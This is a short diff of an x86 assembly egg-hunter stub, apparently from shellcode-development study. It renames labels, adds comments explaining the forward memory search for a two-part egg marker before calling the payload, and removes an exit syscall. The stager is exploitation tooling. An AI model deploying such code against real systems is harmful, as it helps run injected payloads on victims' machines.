@@ -28,26 +28,20 @@ global _start
 
 
 _start:
-	jmp short EggPoint
+	jmp short huntersEnd
 
 continue:
-	pop eax
+	pop eax		; Now EAX points at hunters End
 
 	; Searching for the Egg marker
 next:
-	inc eax		; Searching backwards
+	inc eax		; Searching forward
 isEgg:
-	cmp dword [eax-8], egg1
-	jne next
+	cmp dword [eax-8], egg1		; Checking if we can see egg1
+	jne next			; If not, continuing to search
 	cmp dword [eax-4], egg2
 	jne next
-	call eax
+	call eax			; Once found, we call our payload
 
-	; EXIT
-	xor eax, eax
-	mov al, 1
-	xor ebx, ebx
-	int 0x80
-
-EggPoint:
+huntersEnd:
 	call continue
